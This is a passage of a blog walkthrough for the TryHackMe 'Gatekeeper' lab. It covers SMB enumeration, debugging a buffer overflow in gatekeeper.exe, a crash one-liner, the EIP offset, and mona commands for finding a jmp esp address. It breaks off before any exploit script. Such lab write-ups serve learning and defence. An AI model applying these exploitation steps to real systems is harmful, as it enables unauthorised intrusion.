@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Try Hack Me - Gatekeeper Walkthrough - noopz</title><meta name="Description" content="A write-up tackling the Gatekeeper box on TryHackMe (https://tryhackme.com/room/gatekeeper). This box focuses on identifying a bufferoverflow in a services that is running and exploiting it to gain a low privilege shell, and then escalating privileges."><meta property="og:title" content="Try Hack Me - Gatekeeper Walkthrough" />
+<meta property="og:description" content="A write-up tackling the Gatekeeper box on TryHackMe (https://tryhackme.com/room/gatekeeper). This box focuses on identifying a bufferoverflow in a services that is running and exploiting it to gain a low privilege shell, and then escalating privileges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://noopz.github.io/gatekeeper/" />
+<meta property="og:image" content="https://noopz.github.io/logo.png"/>
+<meta property="article:published_time" content="2020-08-29T08:26:53+00:00" />
+<meta property="article:modified_time" content="2020-08-30T20:41:32-07:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://noopz.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Try Hack Me - Gatekeeper Walkthrough"/>
+<meta name="twitter:description" content="A write-up tackling the Gatekeeper box on TryHackMe (https://tryhackme.com/room/gatekeeper). This box focuses on identifying a bufferoverflow in a services that is running and exploiting it to gain a low privilege shell, and then escalating privileges."/>
+<meta name="application-name" content="noopz">
+<meta name="apple-mobile-web-app-title" content="noopz"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://noopz.github.io/gatekeeper/" /><link rel="prev" href="https://noopz.github.io/narnia_challenges_part6/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.c1380f5e1f7f3d04b48edd22c364da70ed19205a2e23d815183d44b0e70eb6d93101e95794b3b2e22eb84c60c2e534577b1a114426b13da4030d8d61beeb974b.css" integrity="sha512-wTgPXh9/PQS0jt0iw2TacO0ZIFouI9gVGD1EsOcOttkxAelXlLOy4i64TGDC5TRXexoRRCaxPaQDDY1hvuuXSw=="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><meta name="google-site-verification" content="qVeOJnUgOGM26P4YnScH1UZEDcMKWknHB7GATR21Ji0" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Try Hack Me - Gatekeeper Walkthrough",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/noopz.github.io\/gatekeeper\/"
+        },"image": ["https:\/\/noopz.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "tryhackme, hack, python, gatekeeper, bufferoverflow, bad characters","wordcount":  2656 ,
+        "url": "https:\/\/noopz.github.io\/gatekeeper\/","datePublished": "2020-08-29T08:26:53+00:00","dateModified": "2020-08-30T20:41:32-07:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "noopz","logo": "https:\/\/noopz.github.io\/images\/avatar.jpg"},"author": {
+                "@type": "Person",
+                "name": "Zack"
+            },"description": "A write-up tackling the Gatekeeper box on TryHackMe (https://tryhackme.com/room/gatekeeper). This box focuses on identifying a bufferoverflow in a services that is running and exploiting it to gain a low privilege shell, and then escalating privileges."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="noopz"><span class="header-title-pre"><i class='fas fa-hat-wizard fa-fw'></i></span>noopz</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="https://github.com/noopz/" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Try Hack Me - Gatekeeper Walkthrough</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Zack</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-08-29">2020-08-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2656 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#background">Background</a></li>
+    <li><a href="#diving-in">Diving In</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="background">Background</h2>
+<p><a href="https://tryhackme.com/" target="_blank" rel="noopener noreffer">TryHackMe</a> is similar to <a href="https://www.hackthebox.eu/" target="_blank" rel="noopener noreffer">HackTheBox</a>, <a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreffer">VulnHub</a>, and others. One of major differences in THM compared to others is the more gamified approach to tackling boxes. I don&rsquo;t have any experience with some of the other options, but have thus far found the difficultly ramp on THM to be what I was looking for. Lastly, I recommend watching through some of the John Hammond <a href="https://www.youtube.com/watch?v=xl2Xx5YOKcI" target="_blank" rel="noopener noreffer">videos</a> that go through some of the TryHackMe boxes.</p>
+<p>Every box on THM has a theme, the Gatekeeper theme revolves around finding and exploting a buffer overflow in one of the exposed services. The first thing to do is to get the target machine started and connect the Kali machine to the VPN.</p>
+<h2 id="diving-in">Diving In</h2>
+<p>Starting with an <code>nmap</code>scan, the box has a handful of ports open, including SMB and a suspicious <code>31337</code> port. Using <code>nc</code> to connect to <code>31337</code> and sending some input gets a reply of &ldquo;Hello [input]!!!&rdquo; - it looks to be some sort of simple echo service.</p>
+<p>A quick test with <code>python -c &quot;print 'a'*1024&quot;</code> causes the connection to end, likely crashing the program. This is likely why trying to immediate connect after sending the breaking payload fails to connect. The service running on <code>31337</code> has likely crashed and has to restart.</p>
+<p>Next up is to see what <code>enum4linux</code> has to find. After letting it run for a bit and digging through the output, it show that there&rsquo;s a share available with the name of <code>Users</code>. Time to try logging in with <code>smbclient //&lt;ip&gt;/Users</code> as an anonymous (password-less) user. Given that it was successful and poking around a bit shows that there&rsquo;s a <code>gatekeeper.exe</code> that we can download.</p>
+<p>Now for the fun part, it&rsquo;s time to start digging into what the <code>gatekeeper.exe</code> does. As a general safety practice, random executable should never be run on your real machine. So, starting up a Windows VM and pulling over <code>gatekeeper.exe</code> and giving it a quick run shows that it&rsquo;s the same sort of program as the one running on port <code>31337</code> - and that it does actually crash with the excessive length input.</p>
+<p>Next fire-up <a href="https://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener noreffer">Immunity Debugger</a> and searching for <code>All referenced Strings</code> it is possible to find the format string for the <code>Hello %s!!!</code>, putting some break points around there, starting the program and then connecting to it with <code>nc</code> let&rsquo;s us start working through what&rsquo;s going on. Looking into the assembly it&rsquo;s clear that the <code>Hello %s!!!</code>'s buffer is only <code>128</code> characters, yet we can provide a buffer of any length. As much, it should be possible to exploit the overflow and take control over <code>EIP</code>.</p>
+<p>Time for a quick dive into the assembly of the vulnerable function, this output is from <code>Immunity Debugger</code>, which is nice enough to provide some basic comments:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">080416</span><span class="nf">F0</span>  <span class="err">/</span><span class="no">$</span> <span class="mi">55</span>             <span class="no">PUSH</span> <span class="no">EBP</span>
+<span class="err">080416</span><span class="nf">F1</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">BEC</span>           <span class="no">MOV</span> <span class="no">EBP</span><span class="p">,</span><span class="no">ESP</span>
+<span class="err">080416</span><span class="nf">F3</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">81</span><span class="no">EC</span> <span class="mi">94000000</span>  <span class="no">SUB</span> <span class="no">ESP</span><span class="p">,</span><span class="mi">94</span>                               <span class="c">; Reserve 148 bytes on the stack,
+</span><span class="c"></span><span class="mi">080416</span><span class="no">F9</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">B45</span> <span class="mi">0</span><span class="no">C</span>        <span class="no">MOV</span> <span class="no">EAX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP</span><span class="err">+</span><span class="no">C</span><span class="p">]</span>             <span class="c">; From the function parameters, aka our passed in string
+</span><span class="c"></span><span class="mi">080416</span><span class="no">FC</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">50</span>             <span class="no">PUSH</span> <span class="no">EAX</span>                                 <span class="c">; /Arg3 - The passed in string from calling the function, aka our payload
+</span><span class="c"></span><span class="mi">080416</span><span class="no">FD</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">68</span> <span class="no">F0410408</span>    <span class="no">PUSH</span> <span class="no">gatekeep.080441F0</span>                   <span class="c">; |Arg2 = 080441F0 ASCII &#34;Hello %s!!!&#34;
+</span><span class="c"></span><span class="mi">08041702</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">D8D</span> <span class="mi">6</span><span class="no">CFFFFFF</span>  <span class="no">LEA</span> <span class="no">ECX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-94</span><span class="p">]</span>            <span class="c">; |
+</span><span class="c"></span><span class="mi">08041708</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">51</span>             <span class="no">PUSH</span> <span class="no">ECX</span>                                 <span class="c">; |Arg1 - This is the buffer on the stack
+</span><span class="c"></span><span class="mi">08041709</span>  <span class="err">|</span><span class="p">.</span> <span class="no">E8</span> <span class="no">F2F9FFFF</span>    <span class="no">CALL</span> <span class="no">gatekeep.08041100</span>                   <span class="c">; \ Some sort of sprintf(...) function and where the overflow happens
+</span><span class="c"></span><span class="mi">0804170</span><span class="no">E</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">83</span><span class="no">C4</span> <span class="mi">0</span><span class="no">C</span>        <span class="no">ADD</span> <span class="no">ESP</span><span class="p">,</span><span class="mi">0</span><span class="no">C</span>
+<span class="err">08041711</span>  <span class="err">|.</span> <span class="err">8</span><span class="nf">D95</span> <span class="mi">6</span><span class="no">CFFFFFF</span>  <span class="no">LEA</span> <span class="no">EDX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-94</span><span class="p">]</span>
+<span class="err">08041717</span>  <span class="err">|.</span> <span class="err">8955</span> <span class="nf">F8</span>        <span class="no">MOV</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-8</span><span class="p">],</span><span class="no">EDX</span>
+<span class="err">0804171</span><span class="nf">A</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">B45</span> <span class="no">F8</span>        <span class="no">MOV</span> <span class="no">EAX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-8</span><span class="p">]</span>
+<span class="err">0804171</span><span class="nf">D</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">83</span><span class="no">C0</span> <span class="mi">01</span>        <span class="no">ADD</span> <span class="no">EAX</span><span class="p">,</span><span class="mi">1</span>
+<span class="err">08041720</span>  <span class="err">|.</span> <span class="err">8945</span> <span class="nf">F0</span>        <span class="no">MOV</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-10</span><span class="p">],</span>               <span class="c">; The usage here clues us into the size of the buffer, like 128 bytes
+</span><span class="c"></span><span class="mi">08041723</span>  <span class="err">|&gt;</span> <span class="mi">8</span><span class="no">B4D</span> <span class="no">F8</span>        <span class="err">/</span><span class="no">MOV</span> <span class="no">ECX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-8</span><span class="p">]</span>
+<span class="err">08041726</span>  <span class="err">|.</span> <span class="err">8</span><span class="nf">A11</span>           <span class="err">|</span><span class="no">MOV</span> <span class="no">DL</span><span class="p">,</span><span class="no">BYTE</span> <span class="no">PTR</span> <span class="no">DS</span><span class="p">:[</span><span class="no">ECX</span><span class="p">]</span>
+<span class="err">08041728</span>  <span class="err">|.</span> <span class="err">8855</span> <span class="nf">FF</span>        <span class="err">|</span><span class="no">MOV</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-1</span><span class="p">],</span><span class="no">DL</span>
+<span class="err">0804172</span><span class="nf">B</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8345</span> <span class="no">F8</span> <span class="mi">01</span>     <span class="err">|</span><span class="no">ADD</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-8</span><span class="p">],</span><span class="mi">1</span>
+<span class="err">0804172</span><span class="nf">F</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">807</span><span class="no">D</span> <span class="no">FF</span> <span class="mi">00</span>     <span class="err">|</span><span class="no">CMP</span> <span class="no">BYTE</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-1</span><span class="p">],</span><span class="mi">0</span>
+<span class="err">08041733</span>  <span class="err">|.^75</span> <span class="nf">EE</span>          <span class="err">\</span><span class="no">JNZ</span> <span class="no">SHORT</span> <span class="no">gatekeep.08041723</span>
+<span class="err">08041735</span>  <span class="err">|.</span> <span class="err">8</span><span class="nf">B45</span> <span class="no">F8</span>        <span class="no">MOV</span> <span class="no">EAX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-8</span><span class="p">]</span>
+<span class="err">08041738</span>  <span class="err">|.</span> <span class="err">2</span><span class="nf">B45</span> <span class="no">F0</span>        <span class="no">SUB</span> <span class="no">EAX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-10</span><span class="p">]</span>
+<span class="err">0804173</span><span class="nf">B</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8945</span> <span class="no">EC</span>        <span class="no">MOV</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-14</span><span class="p">],</span><span class="no">EAX</span>
+<span class="err">0804173</span><span class="nf">E</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">6</span><span class="no">A</span> <span class="mi">00</span>          <span class="no">PUSH</span> <span class="mi">0</span>                                   <span class="c">; /Flags = 0
+</span><span class="c"></span><span class="mi">08041740</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">B4D</span> <span class="no">EC</span>        <span class="no">MOV</span> <span class="no">ECX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-14</span><span class="p">]</span>            <span class="c">; |
+</span><span class="c"></span><span class="mi">08041743</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">51</span>             <span class="no">PUSH</span> <span class="no">ECX</span>                                 <span class="c">; |DataSize
+</span><span class="c"></span><span class="mi">08041744</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">D95</span> <span class="mi">6</span><span class="no">CFFFFFF</span>  <span class="no">LEA</span> <span class="no">EDX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-94</span><span class="p">]</span>            <span class="c">; |
+</span><span class="c"></span><span class="mi">0804174</span><span class="no">A</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">52</span>             <span class="no">PUSH</span> <span class="no">EDX</span>                                 <span class="c">; |Data
+</span><span class="c"></span><span class="mi">0804174</span><span class="no">B</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8</span><span class="no">B45</span> <span class="mi">08</span>        <span class="no">MOV</span> <span class="no">EAX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP</span><span class="err">+</span><span class="mi">8</span><span class="p">]</span>             <span class="c">; |
+</span><span class="c"></span><span class="mi">0804174</span><span class="no">E</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">50</span>             <span class="no">PUSH</span> <span class="no">EAX</span>                                 <span class="c">; |Socket
+</span><span class="c"></span><span class="mi">0804174</span><span class="no">F</span>  <span class="err">|</span><span class="p">.</span> <span class="no">FF15</span> <span class="mi">70300408</span>  <span class="no">CALL</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">DS</span><span class="p">:[</span><span class="err">&lt;&amp;</span><span class="no">WS2_32.</span><span class="c">#19&gt;]        ; \send
+</span><span class="c"></span><span class="mi">08041755</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">8945</span> <span class="no">F4</span>        <span class="no">MOV</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-C</span><span class="p">],</span><span class="no">EAX</span>
+<span class="err">08041758</span>  <span class="err">|.</span> <span class="err">837</span><span class="nf">D</span> <span class="no">F4</span> <span class="no">FF</span>     <span class="no">CMP</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-C</span><span class="p">],-</span><span class="mi">1</span>
+<span class="err">0804175</span><span class="nf">C</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">75</span> <span class="mi">23</span>          <span class="no">JNZ</span> <span class="no">SHORT</span> <span class="no">gatekeep.08041781</span>
+<span class="err">0804175</span><span class="nf">E</span>  <span class="err">|</span><span class="p">.</span> <span class="no">FF15</span> <span class="mi">84300408</span>  <span class="no">CALL</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">DS</span><span class="p">:[</span><span class="err">&lt;&amp;</span><span class="no">WS2_32.</span><span class="c">#111&gt;]       ; [WSAGetLastError
+</span><span class="c"></span><span class="mi">08041764</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">50</span>             <span class="no">PUSH</span> <span class="no">EAX</span>                                 <span class="c">; /Arg2
+</span><span class="c"></span><span class="mi">08041765</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">68</span> <span class="mi">00420408</span>    <span class="no">PUSH</span> <span class="no">gatekeep.08044200</span>                   <span class="c">; |Arg1 = 08044200 ASCII &#34;send failed: %d&#34;
+</span><span class="c"></span><span class="mi">0804176</span><span class="no">A</span>  <span class="err">|</span><span class="p">.</span> <span class="no">E8</span> <span class="no">D1F8FFFF</span>    <span class="no">CALL</span> <span class="no">gatekeep.08041040</span>                   <span class="c">; \gatekeep.08041040
+</span><span class="c"></span><span class="mi">0804176</span><span class="no">F</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">83</span><span class="no">C4</span> <span class="mi">08</span>        <span class="no">ADD</span> <span class="no">ESP</span><span class="p">,</span><span class="mi">8</span>
+<span class="err">08041772</span>  <span class="err">|.</span> <span class="err">8</span><span class="nf">B4D</span> <span class="mi">08</span>        <span class="no">MOV</span> <span class="no">ECX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP</span><span class="err">+</span><span class="mi">8</span><span class="p">]</span>
+<span class="err">08041775</span>  <span class="err">|.</span> <span class="err">51</span>             <span class="nf">PUSH</span> <span class="no">ECX</span>                                 <span class="c">; /Socket
+</span><span class="c"></span><span class="mi">08041776</span>  <span class="err">|</span><span class="p">.</span> <span class="no">FF15</span> <span class="mi">60300408</span>  <span class="no">CALL</span> <span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">DS</span><span class="p">:[</span><span class="err">&lt;&amp;</span><span class="no">WS2_32.</span><span class="c">#3&gt;]         ; \closesocket
+</span><span class="c"></span><span class="mi">0804177</span><span class="no">C</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">83</span><span class="no">C8</span> <span class="no">FF</span>        <span class="no">OR</span> <span class="no">EAX</span><span class="p">,</span><span class="no">FFFFFFFF</span>
+<span class="err">0804177</span><span class="nf">F</span>  <span class="err">|</span><span class="p">.</span> <span class="no">EB</span> <span class="mi">13</span>          <span class="no">JMP</span> <span class="no">SHORT</span> <span class="no">gatekeep.08041794</span>
+<span class="err">08041781</span>  <span class="err">|&gt;</span> <span class="err">8</span><span class="nf">B55</span> <span class="no">F4</span>        <span class="no">MOV</span> <span class="no">EDX</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="no">SS</span><span class="p">:[</span><span class="no">EBP-C</span><span class="p">]</span>
+<span class="err">08041784</span>  <span class="err">|.</span> <span class="err">52</span>             <span class="nf">PUSH</span> <span class="no">EDX</span>                                 <span class="c">; /Arg2
+</span><span class="c"></span><span class="mi">08041785</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">68</span> <span class="mi">14420408</span>    <span class="no">PUSH</span> <span class="no">gatekeep.08044214</span>                   <span class="c">; |Arg1 = 08044214 ASCII &#34;Bytes sent: %d&#34;
+</span><span class="c"></span><span class="mi">0804178</span><span class="no">A</span>  <span class="err">|</span><span class="p">.</span> <span class="no">E8</span> <span class="no">B1F8FFFF</span>    <span class="no">CALL</span> <span class="no">gatekeep.08041040</span>                   <span class="c">; \gatekeep.08041040
+</span><span class="c"></span><span class="mi">0804178</span><span class="no">F</span>  <span class="err">|</span><span class="p">.</span> <span class="mi">83</span><span class="no">C4</span> <span class="mi">08</span>        <span class="no">ADD</span> <span class="no">ESP</span><span class="p">,</span><span class="mi">8</span>
+<span class="err">08041792</span>  <span class="err">|.</span> <span class="err">33</span><span class="nf">C0</span>           <span class="no">XOR</span> <span class="no">EAX</span><span class="p">,</span><span class="no">EAX</span>
+<span class="err">08041794</span>  <span class="err">|&gt;</span> <span class="err">8</span><span class="nf">BE5</span>           <span class="no">MOV</span> <span class="no">ESP</span><span class="p">,</span><span class="no">EBP</span>
+<span class="err">08041796</span>  <span class="err">|.</span> <span class="err">5</span><span class="nf">D</span>             <span class="no">POP</span> <span class="no">EBP</span>
+<span class="err">08041797</span>  <span class="err">\.</span> <span class="nf">C3</span>             <span class="no">RETN</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>After sending a variety of inputs, looks like it&rsquo;s possible to control the <code>EIP</code> of a particular function with a payload of <code>146</code> characters (<code>147-150</code> is the <code>EIP</code>). With control over <code>EIP</code> it should be possible to determine an address to jump for the shellcode. <code>Immunity Debugger</code> comes with the ability to execute python scripts to make it easier to find what&rsquo;s needed. In this particular case <a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreffer">mona</a>, a swiss army knife that will make our lives easier. First up is to use <code>mona</code> to hopefully find a module that isn&rsquo;t applying ASLR using <code>!mona modules</code>. In this particular case, it turns out that the <code>gatekeeper.exe</code> is what we need:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="../images/../../images/tryhackme/gatekeeper_monamodules.png"
+        data-srcset="../images/../../images/tryhackme/gatekeeper_monamodules.png, ../images/../../images/tryhackme/gatekeeper_monamodules.png 1.5x, ../images/../../images/tryhackme/gatekeeper_monamodules.png 2x"
+        data-sizes="auto"
+        alt="../images/../../images/tryhackme/gatekeeper_monamodules.png"
+        title="mona modules" /></p>
+<p>Now that we know what module we can use, next is to figure out what to replace the <code>EIP</code> with. Before we get to the exact address to use, now is a good time to explain that a good technique for dealing with buffer overflows is to use <code>jmp esp</code>. Since we cannot rely on an address being predictable, we&rsquo;ll instead overwrite the return address to some a point in a library or executable that contains a <code>jmp esp</code>. This roughly looks like the following:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-txt" data-lang="txt">                        +---+
+                        |EIP+---+
+ +--------------------------+   |
+ |Buffer[              ]|RET|   |
+ +-----------------------^--+   |
+                         |      |
+ Exploit Payload         |      |
+ +------------------------------v-----------------+
+ |AAAAAAAAAAAAAAAAAAAAA|jmp esp|[nop]SHELLCODE   |
+ +-----------------------------------------------+
+</code></pre></td></tr></table>
+</div>
+</div><p>The key here is that our payload overflows the <code>EIP</code>/<code>RET</code> address and then continues to overflow the shellcode into the extended stack pointer space. Once the <code>RET</code> pops the 4 bytes off for the <code>jmp esp</code>, it means that the <code>esp</code> now points directly to the start of the shellcode. So once the <code>jmp esp</code> is executed, it&rsquo;ll just continue on to the shellcode. With that out of the way, it&rsquo;s time to use <code>mona</code> to find the <code>jmp esp</code> instruction. There are a few different ways to accomplish this, however I&rsquo;ve found the most straight forward version to be: <code>!mona jmp -r esp</code>. More detailed information can be found here: <a href="https://www.exploit-db.com/docs/english/47032-buffer-overflows,-c-programming,-nsa-ghidra-and-more.pdf" target="_blank" rel="noopener noreffer">exploit-db write up on bufferoverflows</a> and <a href="https://www.usenix.org/legacy/events/sec09/tech/slides/sotirov.pdf" target="_blank" rel="noopener noreffer">bypassing memory protections</a>.</p>
+<p>This gives two possible address that have the instructions needed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
